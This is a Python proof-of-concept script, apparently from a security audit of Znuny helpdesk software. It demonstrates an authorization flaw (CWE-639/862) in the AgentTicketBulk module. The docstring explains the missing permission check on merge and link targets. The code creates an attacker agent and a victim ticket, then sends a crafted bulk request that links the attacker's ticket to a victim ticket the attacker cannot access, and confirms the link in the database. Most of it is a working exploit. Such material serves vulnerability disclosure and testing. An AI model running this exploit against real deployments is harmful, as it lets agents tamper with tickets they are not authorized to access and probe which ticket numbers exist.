#!/usr/bin/env python3
r"""
VULN-002 — AgentTicketBulk;Do merges/links into an unchecked target ticket (any agent)
======================================================================================
Vulnerable code : targets/Znuny/Kernel/Modules/AgentTicketBulk.pm:766-767,1214-1231 (+ perm on
                  SOURCES only at :806/:1474)
Vulnerability   : CWE-639 / CWE-862 Broken object-level authorization

Flaw
----
The bulk action permission-checks every *selected source* ticket (:806 rw, :1474 loop-guard),
but the merge target (`MergeTo`) and the link parent (`LinkTogetherParent`) are resolved from an
attacker-supplied ticket NUMBER and used with **no** permission check on that target:

    1215:  my $MainTicketID = $TicketObject->TicketIDLookup( TicketNumber => $GetParam{'LinkTogetherParent'} );
    1223:  $LinkObject->LinkAdd( SourceKey => $MainTicketID, TargetKey => $TicketID, Type => 'ParentChild', ... );

So an agent re-parents their own tickets onto — or merges into — a victim ticket they cannot
access, and (because TicketIDLookup returns undef for a non-existent number) gets a ticket-number
existence oracle. The sibling `AgentTicketMerge.pm:296-300` DOES check the target, proving the gap.

Exploit: attacker (rw on Raw only) links their source ticket to an off-limits victim by number.
A link_relation row referencing the victim proves the cross-boundary write.
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C

HERE = os.path.dirname(os.path.abspath(__file__))

def main():
    C.banner("VULN-002", "AgentTicketBulk;Do links/merges into an unchecked target ticket",
             ["perm checked on SOURCES only (pm:806/1474); MergeTo/LinkTogetherParent target unchecked (pm:1214)"])
    sfx = C.rid()
    au, ap = C.create_agent(login=f"att002_{sfx}", groups=["users"])
    src_tid, src_tn = C.create_ticket(f"attacker src {sfx}", "Raw", customer_id="a", customer_user="a")
    C.log("SETUP", f"attacker {au} (rw on Raw); source ticket TID={src_tid} TN={src_tn}")
    vgrp = C.create_group(f"vgrp002_{sfx}"); vq = C.create_queue(f"vq002_{sfx}", group=vgrp)
    vic_tid, vic_tn = C.create_ticket(f"victim {sfx}", vq, customer_id="v", customer_user="v")
    C.log("SETUP", f"victim ticket TID={vic_tid} TN={vic_tn} in off-limits queue {vq}")

    a = C.agent_client(au, ap)
    src_perm = C.perm_check(au, src_tid); vic_perm = C.perm_check(au, vic_tid)
    C.log("PROOF", f"attacker perm on source {src_tid}={src_perm}; on victim {vic_tid}={vic_perm}")
    if any(vic_perm.values()):
        C.failed("premise broken: attacker already has rights on the victim")

    tok, _ = a.refresh_token(C.AGENT_URL + f"?Action=AgentTicketBulk;TicketID={src_tid}")
    # LinkTogetherParent=<victim NUMBER> -> LinkAdd(SourceKey=victim, TargetKey=source), unchecked.
    data = {"Action": "AgentTicketBulk", "Subaction": "Do", "ChallengeToken": tok,
            "TicketID": str(src_tid), "LinkTogetherParent": vic_tn}
    C.log("STEP", f"POST Bulk Do: selected source {src_tid}, LinkTogetherParent={vic_tn} (victim number)")
    r = a.post(data=data)
    C.log("INFO", f"Bulk HTTP {r.status_code}")

    rows = C.db("SELECT source_key,target_key FROM link_relation "
                f"WHERE source_key='{vic_tid}' AND target_key='{src_tid}'")
    C.log("PROOF", f"link_relation rows referencing victim {vic_tid} as parent of source {src_tid}: {rows}")

    open(os.path.join(HERE, "request.http"), "w").write(
        "POST /znuny/index.pl HTTP/1.1\r\nCookie: OTRSAgentInterface=<attacker>\r\n\r\n"
        f"Action=AgentTicketBulk&Subaction=Do&ChallengeToken={tok}&TicketID={src_tid}"
        f"&LinkTogetherParent={vic_tn}\r\n")
    open(os.path.join(HERE, "response.txt"), "w").write(
        f"attacker perm victim={vic_perm}; link_relation(victim->source) rows={rows}\n")

    if rows:
        C.confirmed(f"attacker (no rights on victim {vic_tid}) created a ParentChild link with the "
                    f"off-limits victim as parent of its own ticket {src_tid} via LinkTogetherParent "
                    "— object-level authorization on the bulk merge/link target is absent.")
    else:
        C.failed(f"no link_relation row referencing victim {vic_tid} created: {rows}")

if __name__ == "__main__":
    main()
